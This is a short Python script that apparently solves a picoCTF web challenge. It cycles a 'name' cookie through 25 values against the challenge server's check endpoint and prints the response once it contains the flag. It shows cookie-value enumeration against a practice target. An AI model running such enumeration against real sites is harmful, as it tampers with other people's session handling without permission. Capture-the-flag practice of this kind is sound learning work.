import requests

for i in range(25):
    cookie = "name={}".format(i)
    headers = {'Cookie': cookie}

    x = requests.get('http://mercury.picoctf.net:29649/check', headers=headers)
    if (x.status_code == 200) and ('picoCTF' in x.text):

        print(x.text)

